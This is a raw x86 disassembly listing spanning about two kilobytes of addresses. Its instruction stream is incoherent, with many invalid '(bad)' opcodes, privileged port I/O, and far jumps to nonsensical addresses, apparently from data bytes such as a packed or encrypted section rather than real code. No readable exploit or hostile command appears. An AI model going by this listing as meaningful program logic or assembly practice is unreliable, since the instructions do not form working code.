  412fdb:	adc    DWORD PTR [esi-0x51],ebx
  412fde:	sbb    BYTE PTR [edx+0x75],dh
  412fe1:	ins    BYTE PTR es:[edi],dx
  412fe2:	xchg   edx,eax
  412fe3:	jg     0x413027
  412fe5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fe6:	adc    BYTE PTR [eax],dh
  412fe8:	test   BYTE PTR [edx-0x69],ah
  412feb:	jl     0x41302f
  412fed:	push   ebx
  412fee:	out    dx,eax
  412fef:	mov    ah,0xa0
  412ff1:	test   al,0x4f
  412ff3:	js     0x412fbe
  412ff5:	sbb    al,0x3f
  412ff7:	xor    al,BYTE PTR [esi]
  412ff9:	mov    edx,0x20479658
  412ffe:	out    dx,al
  412fff:	mov    esi,0xb3967b50
  413004:	push   ds
  413005:	xor    eax,0xbcffc256
  41300a:	shl    BYTE PTR [edx+ecx*1],0x2c
  41300e:	mov    esi,esp
  413010:	rol    ecx,1
  413012:	mov    ch,BYTE PTR [ecx-0x5f]
  413015:	mov    DWORD PTR [edx],ecx
  413017:	scas   al,BYTE PTR es:[edi]
  413018:	stos   BYTE PTR es:[edi],al
  413019:	std    
  41301a:	ja     0x412fa3
  41301c:	xor    eax,0x6c4b079a
  413021:	addr16 xchg esp,eax
  413023:	in     eax,dx
  413024:	stos   BYTE PTR es:[edi],al
  413025:	jecxz  0x413089
  413027:	mov    ch,0xea
  413029:	push   0x45
  41302b:	imul   edx,ebx,0xffffffe2
  41302e:	dec    eax
  41302f:	pop    ebp
  413030:	and    BYTE PTR ss:[eax+0x6b],ch
  413034:	lahf   
  413035:	push   eax
  413036:	jbe    0x413052
  413038:	sub    al,0xaf
  41303a:	dec    ebx
  41303b:	jge    0x412fe9
  41303d:	mov    edi,0xd0e8572d
  413042:	(bad)  
  413043:	xor    ebx,DWORD PTR [ecx+0x63]
  413046:	inc    ecx
  413047:	fmul   DWORD PTR [ecx+ebx*2-0x28f8bad3]
  41304e:	call   0x3ce363a8
  413053:	or     dh,BYTE PTR [ecx+ebx*2-0x58ceb687]
  41305a:	pop    edi
  41305b:	cdq    
  41305c:	mov    ?,WORD PTR [ecx-0xf]
  41305f:	fs push esp
  413061:	data16 and BYTE PTR [ecx],ch
  413064:	mov    dh,BYTE PTR [edx]
  413066:	dec    esi
  413067:	push   ebx
  413068:	(bad)  
  413069:	sub    ebp,edi
  41306b:	mov    al,ds:0xc83d6f59
  413070:	inc    edx
  413071:	outs   dx,BYTE PTR ds:[esi]
  413072:	and    al,0xf8
  413074:	adc    ebp,ecx
  413076:	fcomp  st(1)
  413078:	lods   eax,DWORD PTR ds:[esi]
  413079:	adc    al,0x8
  41307b:	aam    0xd2
  41307d:	lahf   
  41307e:	and    bl,BYTE PTR [edx+0x2d]
  413081:	jecxz  0x413040
  413083:	add    edi,esi
  413085:	sbb    al,0x80
  413087:	xlat   BYTE PTR ds:[ebx]
  413088:	adc    al,0xdc
  41308a:	popa   
  41308b:	and    al,0xa7
  41308d:	out    0x9,al
  41308f:	inc    esp
  413090:	cmp    al,0x73
  413092:	xchg   DWORD PTR [edx-0x59],ecx
  413095:	sbb    edx,DWORD PTR [eax+0x3e98c4c6]
  41309b:	jns    0x4130f6
  41309d:	push   eax
  41309e:	sbb    bl,al
  4130a0:	mov    eax,0x16552c65
  4130a5:	nop
  4130a6:	inc    ecx
  4130a7:	fstp   QWORD PTR [edx+0x56]
  4130aa:	add    eax,DWORD PTR [edi-0x1e]
  4130ad:	pop    es
  4130ae:	ds (bad) 
  4130b0:	jg     0x4130f9
  4130b2:	push   ds
  4130b3:	ss sahf 
  4130b5:	and    al,0xa5
  4130b7:	xchg   edx,eax
  4130b8:	sub    DWORD PTR ds:[edx+0x52],0xfffffff0
  4130bd:	xor    cl,BYTE PTR [esi+eiz*4+0x409d4def]
  4130c4:	mov    si,0xecf3
  4130c8:	mov    es,WORD PTR [esi+0x32]
  4130cb:	adc    BYTE PTR [ecx+0x8],al
  4130ce:	dec    ebp
  4130cf:	inc    ecx
  4130d0:	mov    gs,WORD PTR [ebp-0x59]
  4130d3:	out    dx,eax
  4130d4:	loopne 0x4130bc
  4130d6:	xchg   esi,eax
  4130d7:	lods   eax,DWORD PTR ds:[esi]
  4130d8:	in     eax,dx
  4130d9:	test   eax,0x2658d220
  4130de:	add    BYTE PTR [eax+edi*2-0x33],bh
  4130e2:	jno    0x413145
  4130e4:	xchg   edi,eax
  4130e5:	push   edx
  4130e6:	jg     0x4130b5
  4130e8:	je     0x4130c7
  4130ea:	xlat   BYTE PTR ds:[ebx]
  4130eb:	(bad)  
  4130ed:	je     0x4130a8
  4130ef:	jno    0x41307f
  4130f1:	sbb    al,0xdf
  4130f3:	(bad)  
  4130f4:	mov    eax,0x32f0a547
  4130f9:	adc    DWORD PTR [esi-0xfd517be],eax
  4130ff:	jl     0x413138
  413101:	pop    ebp
  413102:	or     BYTE PTR [ebx+0x51],ah
  413105:	iret   
  413106:	aas    
  413107:	leave  
  413108:	cmp    al,0xac
  41310a:	push   0xc439068a
  41310f:	test   al,0xb9
  413111:	cdq    
  413112:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413113:	loop   0x41309b
  413115:	aam    0x20
  413117:	scas   eax,DWORD PTR es:[edi]
  413118:	aam    0x13
  41311a:	jne    0x4130ee
  41311c:	out    0x79,al
  41311e:	test   esi,eax
  413120:	cmc    
  413121:	cmp    al,0x3a
  413123:	je     0x413162
  413125:	loop   0x413149
  413127:	push   0xffffff83
  413129:	jecxz  0x4130e6
  41312b:	xchg   ebp,esp
  41312d:	cwde   
  41312e:	stos   BYTE PTR es:[edi],al
  41312f:	inc    edx
  413130:	popa   
  413131:	in     al,dx
  413132:	mov    bl,0x6f
  413134:	cli    
  413135:	mov    edx,0xc6f4d848
  41313a:	and    eax,0x9a683c84
  41313f:	call   0x155b:0xdb3875d8
  413146:	call   0x7373:0xebddbda6
  41314d:	pop    ds
  41314e:	dec    esp
  41314f:	push   eax
  413150:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413151:	mov    ecx,0x2127c003
  413156:	xchg   BYTE PTR [edi+0x67],al
  413159:	xchg   BYTE PTR [ebx+ebp*1],cl
  41315c:	dec    edx
  41315d:	bound  esp,QWORD PTR [esi-0x5f]
  413160:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413161:	fcom   st(1)
  413163:	push   ebp
  413164:	mov    dh,bl
  413166:	fxam   
  413168:	popf   
  413169:	lods   eax,DWORD PTR ds:[esi]
  41316a:	out    0xe0,al
  41316c:	mov    al,ds:0xdaf33242
  413171:	xor    DWORD PTR [edx],ebx
  413173:	clc    
  413174:	mov    DWORD PTR [eax],ecx
  413176:	jae    0x4131cc
  413178:	xor    ebp,DWORD PTR [edx+eax*8+0x15]
  41317c:	cli    
  41317d:	dec    ecx
  41317e:	xlat   BYTE PTR ds:[ebx]
  41317f:	xchg   ecx,eax
  413180:	adc    DWORD PTR [edi],edi
  413182:	sbb    DWORD PTR [esi-0x7a454b93],esp
  413188:	rcr    BYTE PTR [ebp-0x23e54141],1
  41318e:	call   0x9a29e854
  413193:	pop    esi
  413194:	inc    edx
  413195:	push   esp
  413196:	dec    esi
  413197:	hlt    
  413198:	sbb    BYTE PTR [ebp+0x503f6b96],ah
  41319e:	push   0x246cb1e5
  4131a3:	daa    
  4131a4:	ins    BYTE PTR es:[edi],dx
  4131a5:	push   esi
  4131a6:	mov    esp,0x9d03b1c
  4131ab:	push   0xa770aa1e
  4131b0:	(bad)  [ecx]
  4131b2:	pop    esp
  4131b3:	sub    eax,0x977c4fd0
  4131b8:	ins    BYTE PTR es:[edi],dx
  4131b9:	cmp    BYTE PTR [ebp+0x71b9cda8],ah
  4131bf:	ret    0x9df1
  4131c2:	call   0x471ef5f6
  4131c7:	int    0xbd
  4131c9:	jmp    0xa12b:0xfa6c6728
  4131d0:	fsqrt  
  4131d2:	adc    al,0x85
  4131d4:	cmp    esp,esp
  4131d6:	call   0xb609067c
  4131db:	cmp    DWORD PTR [ebp+0x5],0x6ce75e98
  4131e2:	imul   ebx,DWORD PTR [edx+ecx*2+0x13],0x17
  4131e7:	cmc    
  4131e8:	push   0x67
  4131ea:	aam    0xfb
  4131ec:	dec    ebp
  4131ed:	adc    BYTE PTR [esi-0x76],cl
  4131f0:	cdq    
  4131f1:	and    DWORD PTR [ebp+0x26],ebp
  4131f4:	mov    WORD PTR [ebx+0x6b53e027],es
  4131fa:	xor    al,BYTE PTR [eax]
  4131fc:	and    dh,dh
  4131fe:	xchg   BYTE PTR [esi-0x21f6c6b7],ah
  413204:	mov    ds:0x225f69be,eax
  413209:	sbb    dl,BYTE PTR [esi]
  41320b:	out    dx,eax
  41320c:	mov    BYTE PTR [eax+0x43876bf0],cl
  413212:	inc    esi
  413213:	jl     0x41320e
  413215:	je     0x4131a7
  413217:	aas    
  413218:	mov    bh,0x81
  41321a:	out    dx,eax
  41321b:	ds inc esi
  41321d:	sub    ecx,0xffffffd7
  413220:	mov    eax,ds:0x4c747bc3
  413225:	out    dx,al
  413226:	mov    eax,ds:0x131d069c
  41322b:	clc    
  41322c:	test   BYTE PTR [esi+0xb],bh
  41322f:	mov    edx,0x46b6761f
  413234:	mov    bl,0xf2
  413236:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413237:	(bad)
  41323a:	cld    
  41323b:	or     dl,dl
  41323d:	js     0x41322a
  41323f:	mov    ds:0x60b9249c,eax
  413244:	xchg   DWORD PTR [edi+0x33],esi
  413247:	sbb    BYTE PTR [ecx-0x6c3bcb1b],bl
  41324d:	fwait
  41324e:	mov    bl,0xfd
  413250:	cmp    al,0xed
  413252:	scas   eax,DWORD PTR es:[edi]
  413253:	loopne 0x4131e0
  413255:	mov    bh,0xf9
  413257:	lds    eax,FWORD PTR [edx+0x7ef7e99a]
  41325d:	jmp    0x5145fb62
  413262:	aas    
  413263:	imul   eax,ecx,0xe768a55
  413269:	shl    BYTE PTR [ecx-0x6c787304],1
  41326f:	sbb    dl,BYTE PTR [eax-0x25]
  413272:	pop    edx
  413273:	mov    bl,0x6a
  413275:	xchg   ecx,eax
  413276:	cmp    al,0xe7
  413278:	mov    eax,ds:0x356276a3
  41327d:	pop    ds
  41327e:	add    al,0xf9
  413280:	push   ebx
  413281:	sbb    eax,0xd2f5d0ea
  413286:	push   eax
  413287:	and    DWORD PTR [esi],ecx
  413289:	ds jmp 0x2a85edc6
  41328f:	inc    esi
  413290:	pop    ecx
  413291:	dec    edx
  413292:	icebp  
  413293:	or     esp,eax
  413295:	sub    eax,0x1a7b26d7
  41329a:	mov    DWORD PTR [edx+0x6615ed67],esp
  4132a0:	mov    al,0x7e
  4132a2:	mov    eax,ds:0x2f894cdc
  4132a7:	aam    0xc0
  4132a9:	jbe    0x41323e
  4132ab:	dec    esp
  4132ac:	mov    bh,0xd1
  4132ae:	push   0x375aedd
  4132b3:	xchg   esi,eax
  4132b4:	adc    ecx,esi
  4132b6:	in     al,dx
  4132b7:	lods   eax,DWORD PTR ds:[esi]
  4132b8:	(bad)  
  4132b9:	jb     0x413272
  4132bb:	jmp    0x41329c
  4132bd:	mov    esp,0x37cf5459
  4132c2:	icebp  
  4132c3:	jmp    0x4132e0
  4132c5:	sub    ah,BYTE PTR [edi-0x76]
  4132c8:	out    dx,eax
  4132c9:	dec    eax
  4132ca:	sub    bl,BYTE PTR [edx]
  4132cc:	pop    edi
  4132cd:	dec    edx
  4132ce:	cmp    al,0x2a
  4132d0:	adc    bh,ah
  4132d2:	jl     0x413265
  4132d4:	and    al,0x2c
  4132d6:	mov    ecx,0x141bda3b
  4132db:	and    BYTE PTR [ebx+eax*8],ah
  4132de:	ins    BYTE PTR es:[edi],dx
  4132df:	push   edx
  4132e0:	push   0x2c1d349e
  4132e5:	dec    edx
  4132e6:	stos   DWORD PTR es:[edi],eax
  4132e7:	dec    ebp
  4132e8:	mov    dh,0xb8
  4132ea:	push   0xffffffc8
  4132ec:	adc    eax,0xfe6ac710
  4132f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132f2:	pop    ebx
  4132f3:	dec    edx
  4132f4:	jg     0x4132bb
  4132f6:	jl     0x413353
  4132f8:	pop    ebx
  4132f9:	xchg   ebx,eax
  4132fa:	and    eax,0x15012d7d
  4132ff:	and    eax,0x154607f1
  413304:	ret    0x1ea9
  413307:	dec    edi
  413308:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413309:	cmc    
  41330a:	sbb    eax,0x6536c5b5
  41330f:	pop    ecx
  413310:	push   ebx
  413311:	ins    BYTE PTR es:[edi],dx
  413312:	out    dx,eax
  413313:	add    cl,BYTE PTR [eax+edx*1+0x35]
  413317:	push   esi
  413318:	jl     0x413352
  41331a:	mov    dh,0x3a
  41331c:	xor    ebp,esp
  41331e:	cwde   
  41331f:	(bad)  
  413320:	dec    ebx
  413321:	adc    BYTE PTR [ebx],cl
  413323:	in     al,0x4c
  413325:	adc    edi,ebx
  413327:	inc    esi
  413328:	jb     0x413317
  41332a:	stc    
  41332b:	dec    eax
  41332c:	sub    ch,0x23
  41332f:	mov    esp,0x6cc77872
  413334:	outs   dx,DWORD PTR ds:[esi]
  413335:	dec    esi
  413336:	xchg   edi,eax
  413337:	loop   0x413301
  413339:	mov    DWORD PTR ss:[ebx+eiz*1-0x54],ecx
  41333e:	cdq    
  41333f:	xchg   ebx,eax
  413340:	dec    edi
  413341:	and    bh,BYTE PTR [edi+eax*1+0x5e]
  413345:	in     eax,0x10
  413347:	out    dx,eax
  413348:	fldcw  WORD PTR [eax+0x21]
  41334b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41334c:	les    edx,FWORD PTR [ecx+0x42]
  41334f:	bound  bx,DWORD PTR gs:[edx]
  413353:	mov    bl,0x3a
  413355:	xchg   eax,ecx
  413357:	push   ebp
  413358:	fucomi st,st(5)
  41335a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41335b:	sbb    eax,0xcd2dea95
  413360:	and    eax,0x97110f9
  413365:	test   eax,0x54b7425a
  41336a:	add    BYTE PTR [edx],ah
  41336c:	cmp    edi,ebx
  41336e:	sub    al,0x26
  413370:	int    0x22
  413372:	mov    WORD PTR [edx-0x17],?
  413375:	jb     0x413384
  413377:	jmp    0x4133af
  413379:	and    eax,0xf452c9e4
  41337e:	nop
  41337f:	or     eax,0x92f1ad1f
  413384:	inc    ecx
  413385:	xor    eax,0x9dd9cfd3
  41338a:	loopne 0x4133a8
  41338c:	pop    ds
  41338d:	daa    
  41338e:	mov    ch,0x7
  413390:	add    al,0xb1
  413392:	mov    ds:0x52e149b7,al
  413397:	xor    al,0xb1
  413399:	imul   ecx,ebx,0xffffff86
  41339c:	or     bh,BYTE PTR [edi+0x49725020]
  4133a2:	rcl    BYTE PTR [ecx-0x73c75325],1
  4133a8:	aas    
  4133a9:	cmp    bl,BYTE PTR [esi]
  4133ab:	ja     0x413366
  4133ad:	outs   dx,DWORD PTR ds:[esi]
  4133ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133af:	bnd js 0x4133d4
  4133b2:	daa    
  4133b3:	mov    bl,0x43
  4133b5:	in     al,dx
  4133b6:	push   esp
  4133b7:	nop
  4133b8:	or     DWORD PTR ds:0x39ec5538,edi
  4133be:	adc    eax,0x770ef3e8
  4133c3:	fcmovb st,st(6)
  4133c5:	bound  ecx,QWORD PTR [edx+edi*8]
  4133c8:	jmp    0xc7bf1f35
  4133cd:	or     DWORD PTR [eax],0x527e1913
  4133d3:	jno    0x41341c
  4133d5:	jecxz  0x4133ef
  4133d7:	dec    ecx
  4133d8:	push   es
  4133d9:	mov    esp,0x9b29f06a
  4133de:	test   eax,eax
  4133e0:	mov    ebp,0x110e7d8b
  4133e5:	shl    DWORD PTR [esp+eiz*4+0x316d929d],cl
  4133ec:	sub    eax,0xaa40502c
  4133f1:	(bad)  
  4133f2:	xlat   BYTE PTR ds:[ebx]
  4133f3:	das    
  4133f4:	les    esi,FWORD PTR [edx+0x17f1c184]
  4133fa:	and    DWORD PTR [ebx+0x19d5a724],0xffffffff
  413401:	rcr    BYTE PTR [ebx-0x604b4765],1
  413407:	test   al,0x54
  413409:	mov    dh,0xca
  41340b:	xchg   al,dh
  41340d:	jge    0x41347f
  41340f:	dec    ebx
  413410:	mov    ds:0x86731a,al
  413415:	jnp    0x4133ff
  413417:	push   ecx
  413418:	loope  0x4133cd
  41341a:	jnp    0x413467
  41341c:	imul   edi,DWORD PTR [ebx+0x20],0x69
  413420:	xchg   edx,eax
  413421:	bound  esp,QWORD PTR [ebp+0x2c1d9cb5]
  413427:	xor    bl,BYTE PTR [eax-0x6de6e2a9]
  41342d:	jb     0x4133f3
  41342f:	cwde   
  413430:	sub    eax,0xddbb2228
  413435:	ds inc ebx
  413437:	shr    DWORD PTR [esi+0x6b],0xd8
  41343b:	shl    BYTE PTR [ecx+0x1e],cl
  41343e:	cmc    
  41343f:	xchg   edi,eax
  413440:	int    0xbd
  413442:	sbb    ecx,ecx
  413444:	push   ss
  413445:	add    bh,bl
  413447:	call   0xd7b9:0x56560b6c
  41344e:	out    0xf7,eax
  413450:	cmp    eax,eax
  413452:	stos   BYTE PTR es:[edi],al
  413453:	loope  0x413471
  413455:	es out dx,eax
  413457:	mov    eax,0xdcc47ac2
  41345c:	iret   
  41345d:	push   edx
  41345e:	jbe    0x413427
  413460:	jno    0x413492
  413462:	popf   
  413463:	push   ebx
  413464:	cmc    
  413465:	sub    DWORD PTR [esi-0x3d],ecx
  413468:	inc    esp
  413469:	jae    0x4134bd
  41346b:	xor    ecx,DWORD PTR [esi-0x4]
  41346e:	hlt    
  41346f:	ror    DWORD PTR [ecx-0x3774d4a1],0x7c
  413476:	add    edx,DWORD PTR [ecx-0x28ae253f]
  41347c:	mov    bh,0xca
  41347e:	xchg   ebp,eax
  41347f:	test   eax,0x32445200
  413484:	jb     0x413478
  413486:	sbb    al,BYTE PTR [ebp-0x7505dfe8]
  41348c:	pop    ecx
  41348d:	mov    ecx,0x48d7603d
  413492:	jb     0x413428
  413494:	cmp    bl,cl
  413496:	mov    eax,ds:0x59a89835
  41349b:	enter  0xa904,0x4
  41349f:	cmc    
  4134a0:	inc    ebp
  4134a1:	push   ebx
  4134a2:	jo     0x4134e9
  4134a4:	add    dh,BYTE PTR [edi]
  4134a6:	std    
  4134a7:	sub    al,0x5f
  4134a9:	jmp    0xd1d7:0x33afec3a
  4134b0:	ins    BYTE PTR es:[edi],dx
  4134b1:	mov    bx,0xf35b
  4134b5:	push   eax
  4134b6:	aam    0x92
  4134b8:	dec    esi
  4134b9:	cmp    ebx,DWORD PTR [eax-0x7c]
  4134bc:	(bad)  
  4134bd:	xor    eax,0x546b4c9b
  4134c2:	mov    bl,0xae
  4134c4:	out    0xc6,al
  4134c6:	mov    ecx,DWORD PTR [edx-0x14afa2c6]
  4134cc:	mov    ebx,0x8c4e33dc
  4134d1:	xchg   esp,eax
  4134d2:	sti    
  4134d3:	or     al,0xa3
  4134d5:	adc    al,0x26
  4134d7:	js     0x4134a4
  4134d9:	mov    eax,cs
  4134db:	and    BYTE PTR [eax+0x32],dl
  4134de:	jg     0x4134ee
  4134e0:	js     0x4134bf
  4134e2:	inc    ebx
  4134e3:	int    0x8e
  4134e5:	out    0xf7,eax
  4134e7:	fistp  WORD PTR [edx-0x141052f0]
  4134ed:	sub    DWORD PTR [esi],esp
  4134ef:	push   ebp
  4134f0:	push   ebx
  4134f1:	ficomp DWORD PTR [eax+0x60]
  4134f4:	inc    edx
  4134f5:	sbb    ebp,ebp
  4134f7:	aas    
  4134f8:	jp     0x4134ac
  4134fa:	rcr    BYTE PTR [eax+0x118a40b5],1
  413500:	cmp    BYTE PTR [edx+ebx*4+0xb],bh
  413504:	mov    ds,WORD PTR [edx+0x186e20f4]
  41350a:	and    BYTE PTR [ebp-0x4e],0xc0
  41350e:	pop    ss
  41350f:	add    ch,BYTE PTR [ebp-0x64]
  413512:	sub    DWORD PTR [ebx],edx
  413514:	adc    al,0x10
  413516:	scas   eax,DWORD PTR es:[edi]
  413517:	out    0x2a,eax
  413519:	(bad)  
  41351b:	or     al,0xc9
  41351d:	ins    BYTE PTR es:[edi],dx
  41351e:	sub    al,0x9d
  413520:	aad    0x43
  413522:	jecxz  0x413597
  413524:	cwde   
  413525:	call   0x21df:0x1c7d1d40
  41352c:	push   esi
  41352d:	adc    DWORD PTR [ebx+0x18],esp
  413530:	les    eax,FWORD PTR [edi+0x36986270]
  413536:	xor    ah,BYTE PTR ds:[ebp-0x4a]
  41353a:	push   0xffffff84
  41353c:	in     al,dx
  41353d:	jle    0x4135bd
  41353f:	xor    BYTE PTR [eax+0xa9c47f],bl
  413545:	lea    ebp,[edi-0x5bcfa50c]
  41354b:	cmp    esp,DWORD PTR [edi+0x4b]
  41354e:	inc    eax
  41354f:	and    ebp,edx
  413551:	push   ds
  413552:	pop    esp
  413553:	dec    ebp
  413554:	mov    edx,0xa20aaa14
  413559:	push   ebx
  41355a:	fild   DWORD PTR [edx]
  41355c:	pop    edi
  41355d:	dec    edi
  41355e:	test   DWORD PTR [ecx],esi
  413560:	fsubr  st,st(5)
  413562:	hlt    
  413563:	dec    eax
  413564:	jmp    0x4135dc
  413566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413567:	outs   dx,DWORD PTR ds:[esi]
  413568:	aas    
  413569:	mov    ebx,DWORD PTR [edi+0x7e8a55c4]
  41356f:	loope  0x413562
  413571:	xor    DWORD PTR [ecx],esp
  413573:	out    dx,eax
  413574:	lahf   
  413575:	jle    0x413582
  413577:	and    BYTE PTR [ebp-0x71],ch
  41357a:	out    dx,al
  41357b:	pop    edi
  41357c:	(bad)  
  41357d:	imul   DWORD PTR [edi]
  41357f:	pop    esi
  413580:	rcr    BYTE PTR [ecx-0x11071eae],0x61
  413587:	jle    0x413538
  413589:	lods   eax,DWORD PTR ds:[esi]
  41358a:	add    DWORD PTR [edx+0x7cb44f3d],ecx
  413590:	push   ecx
  413591:	mov    dl,0x78
  413593:	cld    
  413594:	pop    esi
  413595:	cli    
  413596:	leave  
  413597:	out    dx,al
  413598:	not    DWORD PTR [eax-0x16bda7d9]
  41359e:	push   es
  41359f:	sar    BYTE PTR [ecx],cl
  4135a1:	aam    0x74
  4135a3:	sbb    DWORD PTR [ebp+ebx*8-0x1de4cfa6],esp
  4135aa:	cmc    
  4135ab:	jmp    0x1a9a:0x6db7ff6d
  4135b2:	repz sbb eax,0x3e4d451
  4135b8:	cmp    dh,dl
  4135ba:	es jb  0x41355d
  4135bd:	stc    
  4135be:	xor    BYTE PTR [esi+0x346ad85e],dl
  4135c4:	or     al,0xb7
  4135c6:	ret    0x92b5
  4135c9:	xor    DWORD PTR [edi],ebp
  4135cb:	inc    esp
  4135cc:	mov    BYTE PTR [esi+0x5e],dh
  4135cf:	jl     0x413612
  4135d1:	add    ebx,DWORD PTR es:[edi-0x70]
  4135d5:	dec    eax
  4135d6:	jg     0x4135ab
  4135d8:	fxam   
  4135da:	ret    0x1294
  4135dd:	pop    ecx
  4135de:	dec    ecx
  4135df:	adc    al,0x6b
  4135e1:	and    al,0x66
  4135e3:	jae    0x41363e
  4135e5:	jle    0x413643
  4135e7:	sub    ebp,esi
  4135e9:	inc    ebp
  4135ea:	push   0xffffffdd
  4135ec:	arpl   bx,di
  4135ee:	arpl   WORD PTR [edx],bx
  4135f0:	stos   BYTE PTR es:[edi],al
  4135f1:	push   edx
  4135f2:	cmp    BYTE PTR [edx-0x7],dh
  4135f5:	mov    ah,cl
  4135f7:	add    eax,0x3d1d621d
  4135fc:	daa    
  4135fd:	in     al,0xe
  4135ff:	cmp    ebp,ecx
  413601:	int    0x39
  413603:	sbb    al,BYTE PTR [edi-0x7]
  413606:	adc    BYTE PTR [ebp-0x261e1185],bh
  41360c:	leave  
  41360d:	inc    edx
  41360e:	xchg   edx,eax
  41360f:	xchg   esp,eax
  413610:	fmul   QWORD PTR [edx+0x12]
  413613:	call   0x5a75:0x87a4c001
  41361a:	sahf   
  41361b:	push   ebp
  41361c:	mov    ds:0x4c0fc80,al
  413621:	xchg   edi,eax
  413622:	test   DWORD PTR [ebp-0x586d72f7],edi
  413628:	bound  edi,QWORD PTR [ecx-0x3f]
  41362b:	sahf   
  41362c:	jl     0x4135db
  41362e:	mov    bh,0x51
  413630:	add    eax,0x80eefdc
  413635:	cld    
  413636:	push   ebp
  413637:	add    BYTE PTR [ebx+0x84b5229],bl
  41363d:	test   al,0xf9
  41363f:	add    dh,BYTE PTR [edi]
  413641:	pop    esp
  413643:	sahf   
  413644:	scas   eax,DWORD PTR es:[edi]
  413645:	cmp    BYTE PTR [ecx+ebx*2],al
  413648:	mov    ds,esi
  41364a:	(bad)  
  41364b:	mov    dl,0xea
  41364d:	inc    edx
  41364e:	nop
  41364f:	les    ecx,FWORD PTR [ecx]
  413651:	sub    eax,DWORD PTR [esi+eiz*8+0x76]
  413655:	inc    esi
  413656:	(bad)  
  413657:	out    dx,eax
  413658:	xchg   esi,eax
  413659:	lock nop
  41365b:	push   ebp
  41365c:	(bad)  
  41365e:	cwde   
  41365f:	rcr    dl,0x8f
  413662:	shr    BYTE PTR [esi],cl
  413664:	scas   eax,DWORD PTR es:[edi]
  413665:	pop    es
  413666:	xlat   BYTE PTR ds:[ebx]
  413667:	xchg   edx,eax
  413668:	rcr    DWORD PTR [ebx-0x5cf67cd9],1
  41366e:	push   0x8571f32c
  413673:	jg     0x413694
  413675:	mov    bh,0xd8
  413677:	push   eax
  413678:	inc    ebp
  413679:	scas   eax,DWORD PTR es:[edi]
  41367a:	(bad)  
  41367b:	je     0x4136ce
  41367d:	cmp    eax,esp
  41367f:	add    edx,DWORD PTR [edi]
  413681:	inc    eax
  413682:	cmp    dh,dl
  413684:	sbb    esi,0xffffffab
  413687:	push   cs
  413688:	mov    DWORD PTR [edx+0x54dae0f5],esp
  41368e:	xor    eax,0xc228b3d9
  413693:	sahf   
  413694:	loopne 0x413628
  413696:	add    eax,0x939c939b
  41369b:	rcl    DWORD PTR [ebx],1
  41369d:	push   cs
  41369e:	iret   
  41369f:	bound  edi,QWORD PTR [esi+eiz*4+0x5151f227]
  4136a6:	push   ds
  4136a7:	xor    bh,al
  4136a9:	dec    ecx
  4136aa:	test   DWORD PTR ds:0x206fec42,0xbd80060f
  4136b4:	adc    al,0x18
  4136b6:	dec    ebx
  4136b7:	mov    dl,0x21
  4136b9:	xor    eax,DWORD PTR [ecx]
  4136bb:	push   ebx
  4136bc:	mov    ebx,0x8960e449
  4136c1:	cwde   
  4136c2:	mov    eax,0xe689ab9
  4136c7:	leave  
  4136c8:	mov    eax,ds:0xb941128e
  4136cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136ce:	sbb    ebp,edx
  4136d0:	mov    cs,WORD PTR [ecx+ebp*1+0x45]
  4136d4:	jecxz  0x413710
  4136d6:	(bad)  
  4136d7:	mov    ecx,0x631a5240
  4136dc:	stc    
  4136dd:	xor    ebx,esp
  4136df:	xor    dl,BYTE PTR [ebx+0x5c3611d4]
  4136e5:	push   0xfffffff3
  4136e7:	cwde   
  4136e8:	jp     0x413742
  4136ea:	ror    ebx,1
  4136ec:	mov    esp,0xd44cbfeb
  4136f1:	xchg   DWORD PTR [eax+esi*4],ebp
  4136f4:	popa   
  4136f5:	sub    ch,BYTE PTR [edi+0x74]
  4136f8:	mov    ss,WORD PTR [edi-0x7b7faa1d]
  4136fe:	jmp    0x9100ebd8
  413703:	js     0x4136c7
  413705:	(bad)  
  413706:	les    edi,FWORD PTR [edx+ebp*2+0x14]
  41370a:	jo     0x41369d
  41370c:	ja     0x413776
  41370e:	fld    QWORD PTR [ecx+0x31893f6]
  413714:	(bad)  
  413715:	sbb    eax,0x4501650c
  41371a:	scas   eax,DWORD PTR es:[edi]
  41371b:	xor    DWORD PTR [ebp-0x1d9fa64c],edx
  413721:	xor    DWORD PTR [ebx+edx*2],esp
  413724:	nop
  413725:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413726:	dec    edi
  413727:	outs   dx,DWORD PTR ds:[esi]
  413728:	call   0x53b0:0x89fc18df
  41372f:	or     eax,0xdf0b71ef
  413734:	popa   
  413735:	or     al,0xd
  413737:	loopne 0x413748
  413739:	adc    eax,0x545d6a95
  41373e:	jge    0x41378e
  413740:	std    
  413741:	gs das 
  413743:	mov    edx,0xc654358b
  413748:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413749:	call   DWORD PTR [esi-0x7e]
  41374c:	mov    al,ds:0xb2adb1a8
  413751:	pop    ss
  413752:	jne    0x413799
  413754:	in     eax,dx
  413755:	pusha  
  413756:	popa   
  413757:	cmp    bh,BYTE PTR [ebx-0x6f]
  41375a:	call   0x17d275fd
  41375f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413760:	push   0x9d0aca96
  413765:	shl    bl,0xd7
  413768:	sti    
  413769:	jae    0x41377f
  41376b:	popf   
  41376c:	(bad)  
  41376d:	cmc    
  41376e:	inc    ebp
  41376f:	in     eax,0xf9
  413771:	or     BYTE PTR [esi+0x3b],ch
  413774:	sub    al,0x58
  413776:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413777:	inc    BYTE PTR [ebp+0x654a8d6d]
  41377d:	xor    BYTE PTR [esi+0x423e0b2d],al
  413783:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413784:	push   0x4dcee9c6
  413789:	jnp    0x413769
  41378b:	test   eax,0x3b2f0179
  413790:	aad    0x81
  413792:	(bad)  
  413793:	add    ecx,esp
  413795:	sub    edi,DWORD PTR [edx-0x5b4751e0]
